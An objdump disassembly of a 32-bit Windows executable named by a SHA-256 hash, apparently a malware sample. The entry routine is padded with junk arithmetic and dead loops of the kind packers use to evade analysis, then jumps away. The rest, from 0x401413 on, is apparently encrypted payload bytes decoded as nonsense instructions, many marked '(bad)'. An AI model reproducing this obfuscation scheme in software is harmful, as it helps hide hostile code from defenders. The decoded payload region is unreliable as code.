
b790c9cb4b966f7f36265b5b502631ed7fca6a2a971589746c86ea53d875b570.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x80
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	mov    ecx,DWORD PTR ds:0x428657
  401012:	and    DWORD PTR ds:0x428647,ecx
  401018:	push   ebx
  401019:	movzx  ecx,BYTE PTR ds:0x42862f
  401020:	add    DWORD PTR ds:0x4285cf,ecx
  401026:	push   esi
  401027:	and    DWORD PTR ds:0x42867b,0x0
  401031:	jmp    0x401043
  401036:	mov    esi,DWORD PTR ds:0x42867b
  40103c:	inc    esi
  40103d:	mov    DWORD PTR ds:0x42867b,esi
  401043:	cmp    DWORD PTR ds:0x42867b,0x17
  40104a:	jae    0x401084
  401050:	cmp    DWORD PTR ds:0x42867b,0x24
  401057:	jb     0x401084
  40105d:	jmp    0x40107f
  401062:	push   0x312f
  401067:	push   0x3b66
  40106c:	push   0x8bcc
  401071:	push   DWORD PTR [ebp-0x14]
  401074:	push   0x61c9
  401079:	call   DWORD PTR ds:0x42879f
  40107f:	jmp    0x401036
  401084:	push   edi
  401085:	and    DWORD PTR ds:0x4285e3,0x0
  40108f:	mov    esi,DWORD PTR ds:0x4285e3
  401095:	inc    esi
  401096:	mov    DWORD PTR ds:0x4285e3,esi
  40109c:	cmp    DWORD PTR ds:0x4285e3,0x20
  4010a3:	jbe    0x4010c4
  4010a9:	jmp    0x4010b7
  4010ae:	push   DWORD PTR [ebp-0x18]
  4010b1:	call   DWORD PTR ds:0x4287a3
  4010b7:	cmp    DWORD PTR ds:0x4285e3,0x1f
  4010be:	jb     0x40108f
  4010c4:	mov    esi,0x75108a4
  4010c9:	inc    ecx
  4010ca:	xor    eax,esi
  4010cc:	mov    edi,0x3272ec
  4010d1:	add    eax,edi
  4010d3:	mov    DWORD PTR [ebp-0x28],eax
  4010d6:	and    eax,eax
  4010d8:	mov    eax,ds:0x42816f
  4010dd:	xor    ecx,DWORD PTR ds:0x4285cf
  4010e3:	mov    eax,DWORD PTR [eax]
  4010e5:	sub    DWORD PTR ds:0x42861b,ecx
  4010eb:	mov    DWORD PTR [ebp-0x20],eax
  4010ee:	adc    DWORD PTR ds:0x42862b,edi
  4010f4:	mov    eax,ds:0x428377
  4010f9:	xor    DWORD PTR ds:0x428603,ebx
  4010ff:	mov    eax,DWORD PTR [eax]
  401101:	neg    ecx
  401103:	mov    DWORD PTR [ebp-0x18],eax
  401106:	sbb    DWORD PTR ds:0x428643,ecx
  40110c:	mov    DWORD PTR [ebp-0x24],0xf89c87b0
  401113:	and    DWORD PTR ds:0x42866b,ecx
  401119:	mov    eax,DWORD PTR [ebp-0x24]
  40111c:	mov    ecx,DWORD PTR ds:0x4286a7
  401122:	mov    ecx,DWORD PTR [ecx]
  401124:	sbb    DWORD PTR ds:0x428633,ecx
  40112a:	xor    eax,esi
  40112c:	and    DWORD PTR ds:0x428657,0x0
  401136:	mov    ecx,DWORD PTR ds:0x428657
  40113c:	inc    ecx
  40113d:	mov    DWORD PTR ds:0x428657,ecx
  401143:	cmp    DWORD PTR ds:0x428657,0x15
  40114a:	jg     0x401170
  401150:	jmp    0x401163
  401155:	push   DWORD PTR [ebp-0x20]
  401158:	push   0x428097
  40115d:	call   DWORD PTR ds:0x4287a7
  401163:	cmp    DWORD PTR ds:0x428657,0x13
  40116a:	jb     0x401136
  401170:	add    eax,edi
  401172:	mov    DWORD PTR [ebp-0x28],eax
  401175:	adc    DWORD PTR ds:0x428603,0x6a9
  40117f:	mov    eax,ds:0x4282ef
  401184:	sub    ecx,DWORD PTR ds:0x428647
  40118a:	mov    DWORD PTR [ebp-0x28],eax
  40118d:	mov    DWORD PTR ds:0x4285eb,0x1e
  401197:	cmp    DWORD PTR ds:0x4285eb,0x0
  40119e:	je     0x4011d9
  4011a4:	cmp    DWORD PTR ds:0x4285eb,0x2b
  4011ab:	jg     0x4011d9
  4011b1:	jmp    0x4011c7
  4011b6:	push   0x4280ae
  4011bb:	push   DWORD PTR [ebp-0x18]
  4011be:	push   DWORD PTR [ebp-0xc]
  4011c1:	call   DWORD PTR ds:0x4287ab
  4011c7:	mov    ecx,DWORD PTR ds:0x4285eb
  4011cd:	dec    ecx
  4011ce:	mov    DWORD PTR ds:0x4285eb,ecx
  4011d4:	jmp    0x401197
  4011d9:	mov    eax,DWORD PTR [ebp-0x20]
  4011dc:	mov    DWORD PTR ds:0x4285db,0x1c
  4011e6:	cmp    DWORD PTR ds:0x4285db,0x0
  4011ed:	je     0x401222
  4011f3:	cmp    DWORD PTR ds:0x4285db,0x28
  4011fa:	jbe    0x401222
  401200:	jmp    0x401210
  401205:	push   0x428042
  40120a:	call   DWORD PTR ds:0x4287af
  401210:	mov    ecx,DWORD PTR ds:0x4285db
  401216:	dec    ecx
  401217:	mov    DWORD PTR ds:0x4285db,ecx
  40121d:	jmp    0x4011e6
  401222:	mov    DWORD PTR [ebp-0x10],eax
  401225:	and    DWORD PTR ds:0x428627,0x0
  40122f:	jmp    0x40123f
  401234:	mov    eax,ds:0x428627
  401239:	inc    eax
  40123a:	mov    ds:0x428627,eax
  40123f:	cmp    DWORD PTR ds:0x428627,0x1e
  401246:	jae    0x40128e
  40124c:	cmp    DWORD PTR ds:0x428627,0xa
  401253:	jge    0x40128e
  401259:	jmp    0x40126e
  40125e:	push   0x6cd8
  401263:	push   0x4285eb
  401268:	call   DWORD PTR ds:0x4287b3
  40126e:	cmp    DWORD PTR ds:0x428627,0x9
  401275:	jne    0x401289
  40127b:	xor    eax,eax
  40127d:	add    eax,DWORD PTR ds:0x428627
  401283:	inc    eax
  401284:	mov    ds:0x428627,eax
  401289:	jmp    0x401234
  40128e:	mov    eax,DWORD PTR [ebp-0x10]
  401291:	and    DWORD PTR ds:0x4285ff,0x0
  40129b:	mov    ecx,DWORD PTR ds:0x4285ff
  4012a1:	inc    ecx
  4012a2:	mov    DWORD PTR ds:0x4285ff,ecx
  4012a8:	cmp    DWORD PTR ds:0x4285ff,0x5
  4012af:	jl     0x4012e7
  4012b5:	jmp    0x4012c0
  4012ba:	call   DWORD PTR ds:0x4287b7
  4012c0:	cmp    DWORD PTR ds:0x4285ff,0x4
  4012c7:	jne    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x4285ff
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x4285ff,ecx
  4012da:	cmp    DWORD PTR ds:0x4285ff,0x18
  4012e1:	jb     0x40129b
  4012e7:	push   0x4
  4012e9:	xor    ecx,ecx
  4012eb:	or     ecx,DWORD PTR ds:0x42864b
  4012f1:	sub    DWORD PTR ds:0x4285d3,ecx
  4012f7:	pop    ecx
  4012f8:	or     DWORD PTR ds:0x4285eb,0x6baf
  401302:	sub    ecx,eax
  401304:	and    DWORD PTR ds:0x4285ff,0x0
  40130e:	mov    eax,ds:0x4285ff
  401313:	inc    eax
  401314:	mov    ds:0x4285ff,eax
  401319:	cmp    DWORD PTR ds:0x4285ff,0x1c
  401320:	jg     0x401343
  401326:	jmp    0x401336
  40132b:	push   0x6245
  401330:	call   DWORD PTR ds:0x4287bb
  401336:	cmp    DWORD PTR ds:0x4285ff,0x17
  40133d:	jb     0x40130e
  401343:	add    ecx,DWORD PTR [ebp-0x18]
  401346:	sub    DWORD PTR ds:0x42867b,ecx
  40134c:	mov    DWORD PTR [ebp-0xc],0xf89c85f0
  401353:	mov    DWORD PTR [ebp-0x14],ecx
  401356:	mov    DWORD PTR [ebp-0x80],0xf89c85bc
  40135d:	adc    eax,0x2a9e
  401362:	mov    eax,DWORD PTR [ebp-0x10]
  401365:	mov    DWORD PTR [ebp-0x7c],eax
  401368:	and    DWORD PTR ds:0x42865b,0x0
  401372:	jmp    0x401382
  401377:	mov    eax,ds:0x42865b
  40137c:	inc    eax
  40137d:	mov    ds:0x42865b,eax
  401382:	cmp    DWORD PTR ds:0x42865b,0x14
  401389:	jae    0x4013e1
  40138f:	cmp    DWORD PTR ds:0x42865b,0xd
  401396:	jle    0x4013e1
  40139c:	jmp    0x4013c1
  4013a1:	push   0x5c8c
  4013a6:	push   0x42800b
  4013ab:	push   DWORD PTR [ebp-0x18]
  4013ae:	push   0x42800b
  4013b3:	push   0x513b
  4013b8:	push   DWORD PTR [ebp-0xc]
  4013bb:	call   DWORD PTR ds:0x4287bf
  4013c1:	cmp    DWORD PTR ds:0x42865b,0xc
  4013c8:	jne    0x4013dc
  4013ce:	xor    eax,eax
  4013d0:	add    eax,DWORD PTR ds:0x42865b
  4013d6:	inc    eax
  4013d7:	mov    ds:0x42865b,eax
  4013dc:	jmp    0x401377
  4013e1:	mov    eax,DWORD PTR [ebp-0x14]
  4013e4:	adc    DWORD PTR ds:0x42860f,0x676
  4013ee:	mov    DWORD PTR [ebp-0x78],eax
  4013f1:	mov    eax,DWORD PTR [ebp-0xc]
  4013f4:	sbb    DWORD PTR ds:0x4285db,0x428663
  4013fe:	xor    eax,esi
  401400:	add    eax,edi
  401402:	mov    DWORD PTR [ebp-0x74],eax
  401405:	lea    eax,[ebp-0x1c]
  401408:	mov    DWORD PTR [ebp-0x70],eax
  40140b:	mov    eax,DWORD PTR [ebp-0x80]
  40140e:	jmp    0x4037cc
  401413:	mov    eax,0x80deee36
  401418:	xchg   BYTE PTR [eax-0x320ea8e8],bh
  40141e:	pop    ebx
  40141f:	xchg   esi,eax
  401420:	pusha  
  401421:	pop    edi
  401422:	sub    bh,BYTE PTR [edx+0x7a]
  401425:	jp     0x4014a1
  401427:	fstp   QWORD PTR [edi+0x7a]
  40142a:	jp     0x401451
  40142c:	sub    al,0x27
  40142e:	xor    DWORD PTR [ecx],ebx
  401430:	xor    eax,0x44752f1b
  401435:	imul   esi,DWORD PTR [esi+0x43],0x6d6a6a7e
  40143c:	inc    edx
  40143d:	aad    0xdc
  40143f:	icebp  
  401440:	pusha  
  401441:	dec    eax
  401442:	imul   esi,DWORD PTR [ecx+0x5b],0xffffffa0
  401446:	jo     0x4014b5
  401448:	pop    ecx
  401449:	iret   
  40144a:	pop    ebp
  40144b:	dec    edx
  40144c:	xor    BYTE PTR [edx+edi*8+0x4d678697],cl
  401453:	jg     0x40149c
  401455:	xor    BYTE PTR [esi+0x3bb2b07f],0x2c
  40145c:	push   DWORD PTR [esi-0x24]
  40145f:	cli    
  401460:	arpl   WORD PTR [edi+0x1e],di
  401463:	in     eax,dx
  401464:	cmp    ebp,ecx
  401466:	mov    edx,0xde2397ed
  40146b:	mov    ebp,DWORD PTR [ecx]
  40146d:	mulps  xmm5,XMMWORD PTR [ebx+0x6d07d48a]
  401474:	fst    QWORD PTR [esp+eiz*8]
  401477:	push   cs
  401478:	cli    
  401479:	sbb    BYTE PTR ss:[eax+0xc],cl
  40147d:	imul   ebp,DWORD PTR ss:[eax-0x47],0xffffffaf
  401482:	and    edx,DWORD PTR [ecx+0x15]
  401485:	mov    dh,0xff
  401487:	jmp    0x42c43fd5
  40148c:	enter  0xf95b,0x1a
  401490:	cli    
  401491:	js     0x401444
  401493:	jae    0x401472
  401495:	cwde   
  401496:	pop    edi
  401497:	mov    esi,DWORD PTR [ecx+0x41922417]
  40149d:	add    ebx,DWORD PTR [esi+0xb83823c]
  4014a3:	fisubr DWORD PTR ds:0x43448d62
  4014a9:	fs repz iret 
  4014ac:	mov    ch,BYTE PTR [ecx]
  4014ae:	mov    eax,eax
  4014b0:	(bad)  
  4014b1:	int3   
  4014b2:	mov    BYTE PTR [ecx-0xc],ah
  4014b5:	push   ebp
  4014b6:	bound  ecx,QWORD PTR [esp+ecx*1+0x3e]
  4014ba:	add    eax,DWORD PTR [esi+0x13]
  4014bd:	lods   eax,DWORD PTR ds:[esi]
  4014be:	dec    ebx
  4014bf:	retf   0x40b7
  4014c2:	rcl    BYTE PTR [esi+eiz*2],1
  4014c5:	std    
  4014c6:	bound  esp,QWORD PTR [esi-0x4b]
  4014c9:	stc    
  4014ca:	push   0x1952f8bf
  4014cf:	into   
  4014d0:	jo     0x401540
  4014d2:	pop    esp
  4014d3:	and    esi,ebx
  4014d5:	aas    
  4014d6:	mov    edx,0xc9aefaff
  4014db:	(bad)  
  4014dc:	jne    0x401555
  4014de:	arpl   WORD PTR [edi+edi*2-0x45],bp
  4014e2:	cld    
  4014e3:	out    0xa,al
  4014e5:	inc    eax
  4014e6:	xchg   edx,eax
  4014e7:	test   DWORD PTR [edx],0x86cd6678
  4014ed:	mov    bh,BYTE PTR [edi+0x7dd86e12]
  4014f3:	and    bl,ah
  4014f5:	je     0x762949f
  4014fb:	xor    DWORD PTR [edx-0x5],eax
  4014fe:	xor    BYTE PTR [edx-0x47d7e353],ch
  401504:	imul   ecx,edx,0xec7093c5
  40150a:	mov    al,ds:0x380af7bd
  40150f:	std    
  401510:	push   0xffffffb7
  401512:	push   edi
  401513:	pop    ecx
  401514:	aam    0xd2
  401516:	into   
  401517:	jp     0x4014f8
  401519:	stc    
  40151a:	stos   BYTE PTR es:[edi],al
  40151b:	pop    es
  40151c:	clc    
  40151d:	and    BYTE PTR [ecx],al
  40151f:	inc    ebx
  401520:	in     al,dx
  401521:	cmp    eax,0xf0d34ffc
  401526:	out    dx,al
  401527:	adc    BYTE PTR [edx+0x17],ah
  40152a:	hlt    
  40152b:	in     al,dx
  40152c:	lds    esp,FWORD PTR [edi-0x6fc97cbb]
  401532:	or     DWORD PTR [ecx+0x3],0x75
  401536:	cli    
  401537:	xor    BYTE PTR [esp+ebp*2],dh
  40153a:	in     al,dx
  40153b:	jmp    0xb409dbd3
  401540:	and    al,0xa1
  401542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401543:	push   edi
  401544:	xor    ah,BYTE PTR [esi+0x9]
  401547:	mov    bh,0xfb
  401549:	dec    esp
  40154a:	pop    es
  40154b:	mov    edx,0xdb7b712d
  401550:	stos   DWORD PTR es:[edi],eax
  401551:	mov    ch,0x6a
  401553:	xor    eax,0xbbc21f1a
  401558:	xchg   DWORD PTR [eax],esi
  40155a:	inc    eax
  40155b:	jbe    0x401521
  40155d:	scas   eax,DWORD PTR es:[edi]
  40155e:	les    ebp,FWORD PTR [edi]
  401560:	out    dx,al
  401561:	ins    DWORD PTR es:[edi],dx
  401562:	or     eax,DWORD PTR [eax+0x59]
  401565:	xchg   edx,eax
  401566:	inc    esp
  401567:	jle    0x401591
  401569:	fisub  WORD PTR [ebx-0x35]
  40156c:	loope  0x401570
  40156e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40156f:	mov    ah,BYTE PTR [edx]
  401571:	sahf   
  401572:	mov    BYTE PTR [edi-0x2ca30ab2],cl
  401578:	(bad)  
  401579:	cli    
  40157a:	leave  
  40157b:	in     eax,dx
  40157c:	adc    eax,0x2ccffded
  401581:	add    BYTE PTR [ebp-0x20],ah
  401584:	out    0x47,al
  401586:	xchg   esp,eax
  401587:	push   ss
  401588:	xchg   esp,eax
  401589:	repnz mov esp,0x428ed7e9
  40158f:	fs aad 0x24
  401592:	data16 cmp BYTE PTR [edi+0xf],bh
  401596:	imul   edx,DWORD PTR [edx+ecx*1-0x207a6291],0x80dd4183
  4015a1:	imul   edx,DWORD PTR [ebp-0x2087dceb],0x17
  4015a8:	(bad)  
  4015a9:	(bad)  [edx+0x36be9b75]
  4015af:	jg     0x401537
  4015b1:	and    eax,DWORD PTR [ebp+0x69]
  4015b4:	addr16 dec ecx
  4015b6:	mov    bh,0x4e
  4015b8:	push   es
  4015b9:	cmp    al,0xda
  4015bb:	xor    esp,DWORD PTR [ecx-0x75]
  4015be:	aas    
  4015bf:	data16 mov ds:0x729a49a4,al
  4015c5:	stos   DWORD PTR es:[edi],eax
  4015c6:	inc    ebx
  4015c7:	jb     0x40156a
  4015c9:	xor    ebx,DWORD PTR [esi+0x47]
  4015cc:	pop    edi
  4015cd:	jnp    0x40161e
  4015cf:	test   al,0x23
  4015d1:	call   0x9c67cfe7
  4015d6:	stc    
  4015d7:	xchg   ebx,eax
  4015d8:	repnz call 0x92c7:0x84ca5b78
  4015e0:	inc    edi
  4015e1:	sub    BYTE PTR [esi-0x59cc00e],bh
  4015e7:	in     eax,0x4a
  4015e9:	and    eax,0x4458043a
  4015ee:	es in  al,0xf4
  4015f1:	cmp    BYTE PTR [esi+0x32],ch
  4015f4:	mov    bh,0xa5
  4015f6:	sub    eax,DWORD PTR [edi]
  4015f8:	push   0xcbaff86
  4015fd:	jecxz  0x4015b7
  4015ff:	xchg   ebp,eax
  401600:	dec    esi
  401601:	push   esp
  401602:	add    DWORD PTR [edi-0x164f4a30],ebp
  401608:	fsubrp st(3),st
  40160a:	inc    esp
  40160b:	hlt    
  40160c:	aaa    
  40160d:	jns    0x40166e
  40160f:	out    dx,al
  401610:	addr16 cmc 
  401612:	aam    0xc
  401614:	in     eax,dx
  401615:	nop
  401616:	push   eax
  401617:	cdq    
  401618:	outs   dx,DWORD PTR ds:[esi]
  401619:	fstp   QWORD PTR [esi]
  40161b:	cld    
  40161c:	add    al,0x1f
  40161e:	jnp    0x401672
  401620:	push   edi
  401621:	(bad)  
  401622:	in     eax,0x95
  401624:	int    0x6
  401626:	(bad)  
  401628:	and    eax,0x9497974c
  40162d:	push   ss
  40162e:	sti    
  40162f:	retf   0x46c4
  401632:	pusha  
  401633:	mov    edi,DWORD PTR [ebp-0x43]
  401636:	adc    ebp,edi
  401638:	mov    dh,0xf8
  40163a:	fnsave [ebx+ebp*8]
  40163d:	enter  0x80e1,0x73
  401641:	add    edi,0x59b8eca9
  401647:	(bad)  
  401648:	pop    ecx
  401649:	pop    ebp
  40164a:	sub    dl,BYTE PTR [edx+0x627a4294]
  401650:	test   eax,0x60680d46
  401655:	arpl   WORD PTR [ecx],di
  401657:	scas   al,BYTE PTR es:[edi]
  401658:	xor    DWORD PTR [ecx],ebp
  40165a:	scas   al,BYTE PTR es:[edi]
  40165b:	dec    esi
  40165c:	shl    bl,1
  40165e:	xchg   edi,eax
  40165f:	push   0x11
  401661:	push   ss
  401662:	jmp    0x3181:0x211630cd
  401669:	test   eax,0x59f5321a
  40166e:	xor    ebx,DWORD PTR [eax]
  401670:	arpl   WORD PTR [edx+ebp*2-0x73462119],bx
  401677:	jae    0x401653
  401679:	inc    ebx
  40167a:	mov    al,0xfd
  40167c:	aad    0x78
  40167e:	or     ebx,DWORD PTR [esp+ebp*8]
  401681:	sub    BYTE PTR [edx],ch
  401683:	cmp    eax,0x4452aedf
  401688:	sar    BYTE PTR [ecx+edx*2],0x3
  40168c:	xchg   DWORD PTR [edx+0x16b6eab0],esi
  401692:	pop    esi
  401693:	mov    al,BYTE PTR ds:0x8aca73dc
  401699:	gs int 0xdd
  40169c:	push   esp
  40169d:	sub    eax,0x7ec624ce
  4016a2:	dec    ebx
  4016a3:	out    0xd1,al
  4016a5:	fucomip st,st(1)
  4016a7:	mov    ebx,eax
  4016a9:	or     ah,BYTE PTR [edi+0x17e3c388]
  4016af:	out    0xc3,eax
  4016b1:	add    ah,cl
  4016b3:	popa   
  4016b4:	jbe    0x401661
  4016b6:	cmp    eax,0x57b2668c
  4016bb:	enter  0x639e,0x59
  4016bf:	xor    al,0x60
  4016c1:	pop    edx
  4016c2:	and    eax,0x84806900
  4016c7:	add    al,0xa1
  4016c9:	pop    ss
  4016ca:	inc    edx
  4016cb:	pop    eax
  4016cc:	inc    esp
  4016cd:	rol    eax,0xdd
  4016d0:	xchg   esp,eax
  4016d1:	imul   ah
  4016d3:	inc    ecx
  4016d4:	jns    0x401750
  4016d6:	rol    DWORD PTR ds:[ebp+eiz*1-0x75],1
  4016db:	jbe    0x401672
  4016dd:	test   DWORD PTR fs:[eax-0x4b],esi
  4016e1:	mov    dh,BYTE PTR [ebx]
  4016e3:	or     DWORD PTR [ecx],edi
  4016e5:	es scas al,BYTE PTR es:[edi]
  4016e7:	xchg   edi,eax
  4016e8:	(bad)  
  4016e9:	lock xchg edx,eax
  4016eb:	out    dx,al
  4016ec:	jbe    0x4016f0
  4016ee:	cmp    dl,dh
  4016f0:	repnz (bad) 
  4016f3:	or     eax,0xb0518918
  4016f8:	and    eax,0x4a42358e
  4016fd:	jbe    0x40174e
  4016ff:	push   ebx
  401700:	sahf   
  401701:	jb     0x40174e
  401703:	adc    BYTE PTR [ecx-0x77015500],dl
  401709:	ret    
  40170a:	fstp   DWORD PTR ds:0x60c995cb
  401710:	cmp    eax,0x89b9a648
  401715:	pusha  
  401716:	sub    al,0x6d
  401718:	je     0x4016e6
  40171a:	lahf   
  40171b:	jns    0x401764
  40171d:	mov    es,WORD PTR [edx]
  40171f:	and    edx,DWORD PTR [esi+eiz*4]
  401722:	sub    DWORD PTR [ecx],eax
  401724:	push   cs
  401725:	gs ret 0x28f3
  401729:	cmp    edx,ebx
  40172b:	xor    BYTE PTR [eax],bl
  40172d:	mov    eax,ds:0xead9bd6c
  401732:	dec    esi
  401733:	jno    0x4017a2
  401735:	repnz dec edi
  401737:	not    DWORD PTR [esp+edx*8]
  40173a:	and    BYTE PTR [ecx+0x48eb8b12],bl
  401740:	and    al,0x76
  401742:	xor    eax,0x2efe65e3
  401747:	call   0x280002b7
  40174c:	and    BYTE PTR [esi-0x3bc50f41],dl
  401752:	into   
  401753:	xchg   esi,eax
  401754:	shr    esi,1
  401756:	inc    ebx
  401757:	rcl    ah,1
  401759:	jg     0x401722
  40175b:	idiv   esi
  40175d:	retf   
  40175e:	loop   0x401725
  401760:	cs in  al,dx
  401762:	mov    DWORD PTR [ebx+ecx*4-0x56d1a99d],0x10687f87
  40176d:	adc    ecx,DWORD PTR [ebp-0x258bcb37]
  401773:	pop    ss
  401774:	inc    ecx
  401775:	stc    
  401776:	inc    edi
  401777:	pop    esp
  401778:	int3   
  401779:	adc    esp,edi
  40177b:	push   ebx
  40177c:	fisubr DWORD PTR [esi-0x7b52856d]
  401782:	pushf  
  401783:	add    eax,0x7fdccfa9
  401788:	fcomip st,st(3)
  40178a:	shl    BYTE PTR [edx+0x296bdd2e],0xd2
  401791:	jnp    0x40175d
  401793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401794:	mov    ds:0x886292fb,al
  401799:	push   ebx
  40179a:	xor    bl,BYTE PTR [eax+0xb5ba2a5]
  4017a0:	clc    
  4017a1:	xchg   esi,eax
  4017a2:	pop    ecx
  4017a3:	out    0xd9,al
  4017a5:	xor    dh,bh
  4017a7:	sub    al,0x49
  4017a9:	hlt    
  4017aa:	iret   
  4017ab:	xchg   ebp,eax
  4017ac:	sar    DWORD PTR [edx],0xc6
  4017af:	inc    edi
  4017b0:	pop    ecx
  4017b1:	nop
  4017b2:	call   DWORD PTR [ebx+0x105ce1b9]
  4017b8:	jle    0x401767
  4017ba:	test   eax,0xf354474f
  4017bf:	xchg   edx,eax
  4017c0:	and    al,0x50
  4017c2:	cmc    
  4017c3:	push   0x6125d424
  4017c8:	std    
  4017c9:	fisubr WORD PTR [edx+0x2c67851a]
  4017cf:	mov    bl,0x5b
  4017d1:	repz pusha 
  4017d3:	mov    eax,0x2da4eabc
  4017d8:	jge    0x401824
  4017da:	aad    0xd9
  4017dc:	or     al,0xc3
  4017de:	sahf   
  4017df:	add    BYTE PTR [edi+0x6be598d5],ch
  4017e5:	pop    edx
  4017e6:	jge    0x40177e
  4017e8:	cmp    edx,DWORD PTR [esi-0x58ff3717]
  4017ee:	loopne 0x4017c3
  4017f0:	pushf  
  4017f1:	fild   QWORD PTR [eax-0x7cbf796c]
  4017f7:	push   ss
  4017f8:	jle    0x401793
  4017fa:	test   al,ch
  4017fc:	xor    BYTE PTR [edi+0x36],ch
  4017ff:	repnz cmp eax,0x3f90f8bb
  401805:	or     al,0xa2
  401807:	inc    ebx
  401808:	call   DWORD PTR [edx+0x46a72f14]
  40180e:	xchg   ecx,eax
  40180f:	push   edi
  401810:	aas    
  401811:	inc    eax
  401812:	xor    edi,DWORD PTR [esi]
  401814:	pop    ebx
  401815:	cmp    edi,DWORD PTR [ebp+0x3cb2f2]
  40181b:	sbb    bh,BYTE PTR [esi+ebx*2+0x9]
  40181f:	jo     0x401857
  401821:	adc    BYTE PTR [ecx+0x29641e6d],0x18
  401828:	pop    edx
  401829:	cwde   
  40182a:	push   ds
  40182b:	pusha  
  40182c:	dec    ecx
  40182d:	(bad)  
  40182e:	in     eax,dx
  40182f:	enter  0x45f3,0x16
  401833:	and    dl,bl
  401835:	fld    TBYTE PTR [ecx]
  401837:	pop    esp
  401838:	xchg   ecx,eax
  401839:	retf   
  40183a:	sbb    al,0xa4
  40183c:	jnp    0x401825
  40183e:	les    ebp,FWORD PTR [edi-0x5d]
  401841:	neg    BYTE PTR [ebx-0xb4973b5]
  401847:	push   ss
  401848:	addr16 push esi
  40184a:	sbb    BYTE PTR [esi-0x7c],0xd
  40184e:	shl    DWORD PTR [edi-0x30ece7e4],0x21
  401855:	addr16 push ds
  401857:	inc    ebx
  401858:	mov    cl,0x38
  40185a:	sub    cl,cl
  40185c:	cdq    
  40185d:	jg     0x401874
  40185f:	mov    al,0x3f
  401861:	push   ss
  401862:	stc    
  401863:	adc    eax,0x99a510e8
  401868:	shl    al,0x57
  40186b:	dec    edx
  40186c:	jns    0x40182d
  40186e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40186f:	sahf   
  401870:	fiadd  WORD PTR [ebp+0x1c]
  401873:	lds    ecx,FWORD PTR [edi-0x75cb420f]
  401879:	js     0x401873
  40187b:	add    eax,eax
  40187d:	scas   eax,DWORD PTR es:[edi]
  40187e:	enter  0x8018,0x57
  401882:	inc    edx
  401883:	mov    cl,0x7b
  401885:	sub    al,bh
  401887:	push   ecx
  401888:	mov    dl,0x1f
  40188a:	adc    al,0x76
  40188c:	mov    ebx,0x710b45d9
  401891:	sbb    al,0x10
  401893:	fdivr  st(1),st
  401895:	mov    ds:0xbfb4fb02,eax
  40189a:	in     al,0x74
  40189c:	sar    BYTE PTR [edi+0x71bb2d76],cl
  4018a2:	xor    bh,BYTE PTR [edx-0xd]
  4018a5:	rcl    BYTE PTR [esi-0x212cc8c2],1
  4018ab:	test   BYTE PTR ds:0x9caa7c7d,bh
  4018b1:	adc    BYTE PTR [ebx-0x259ab065],dl
  4018b7:	push   es
  4018b8:	and    eax,eax
  4018ba:	lock or dh,BYTE PTR ds:0xbf4051d3
  4018c1:	inc    esp
  4018c2:	push   eax
  4018c3:	(bad)  
  4018c5:	sar    DWORD PTR [ecx],1
  4018c7:	fcom   DWORD PTR [ebp-0x58d0d869]
  4018cd:	dec    edx
  4018ce:	mov    BYTE PTR [edx-0x61],dh
  4018d1:	mov    ebx,DWORD PTR [ecx-0x5b3ac4f8]
  4018d7:	mov    bl,0x73
  4018d9:	fnstenv [edi-0x658704ec]
  4018df:	aas    
  4018e0:	dec    esi
  4018e1:	mov    BYTE PTR [ebx-0x3d],al
  4018e4:	inc    DWORD PTR [eax+eax*8-0x23]
  4018e8:	xchg   edi,eax
  4018e9:	mov    ebx,0x7230f548
  4018ee:	in     al,dx
  4018ef:	dec    ebx
  4018f0:	stos   DWORD PTR es:[edi],eax
  4018f1:	dec    ebp
  4018f2:	jmp    0xac99:0x982cc543
  4018f9:	mov    esi,0x9d91029b
  4018fe:	and    ch,BYTE PTR [edi]
  401900:	xchg   ebx,eax
  401901:	xchg   DWORD PTR [ebx+0x38],ebp
  401904:	or     eax,0x163d43be
  401909:	repnz out dx,eax
  40190b:	jge    0x40195f
  40190d:	imul   edx,DWORD PTR [eax-0x61],0x23
  401911:	(bad)  
  401912:	scas   eax,DWORD PTR es:[edi]
  401913:	xchg   ebx,eax
  401914:	popa   
  401915:	add    BYTE PTR [esi+edi*4+0x1c7a5bf1],ch
  40191c:	mov    bl,0x2f
  40191e:	dec    edi
  40191f:	jns    0x40193a
  401921:	jbe    0x4018d4
  401923:	imul   esi,DWORD PTR [eax-0x2b],0x51
  401927:	mov    ds:0x115ddef5,eax
  40192c:	fcomp  QWORD PTR cs:[ebp+ebp*4-0x594db71f]
  401934:	bound  ebp,QWORD PTR [esi+0x2]
  401937:	pusha  
  401938:	add    BYTE PTR [edx+0x3ae09c36],dh
  40193e:	pop    es
  40193f:	fistp  WORD PTR [esi-0x154e49e9]
  401945:	aad    0x40
  401947:	sbb    DWORD PTR [ebp+0x67df613f],ecx
  40194d:	cmp    eax,0x96b7f370
  401952:	fmul   QWORD PTR [ebp+0x2633f686]
  401958:	jmp    0x6ad1:0x1b771bc0
  40195f:	out    0x93,eax
  401961:	fst    st(4)
  401963:	js     0x40195d
  401965:	aad    0x4f
  401967:	aas    
  401968:	mov    al,BYTE PTR [esi-0x15]
  40196b:	test   edi,edx
  40196d:	fmul   DWORD PTR [ebx-0x6d]
  401970:	mov    edx,edx
  401972:	dec    esp
  401973:	or     al,0xe9
  401975:	lahf   
  401976:	pushf  
  401977:	xchg   esp,eax
  401978:	loopne 0x401911
  40197a:	mov    al,ds:0xa8906616
  40197f:	add    ebp,DWORD PTR [ebx+esi*8-0x2e]
  401983:	sub    eax,0x41404d6a
  401988:	push   cs
  401989:	sbb    BYTE PTR [eax+0x6a1e028f],0x9d
  401990:	sbb    BYTE PTR [ebp+0x8e277ef],0xd8
  401997:	pop    ecx
  401998:	xchg   DWORD PTR [esi+0x1039a484],ecx
  40199e:	jge    0x4019d8
  4019a0:	test   DWORD PTR es:[eax+0x67969ed1],0xce8ef66d
  4019ab:	shl    DWORD PTR [esi],cl
  4019ad:	call   0xe39438a9
  4019b2:	push   0xffffffb8
  4019b4:	pop    DWORD PTR [ebx]
  4019b6:	pop    esi
  4019b7:	and    cl,ch
  4019b9:	hlt    
  4019ba:	mov    dl,0xb3
  4019bc:	jbe    0x401995
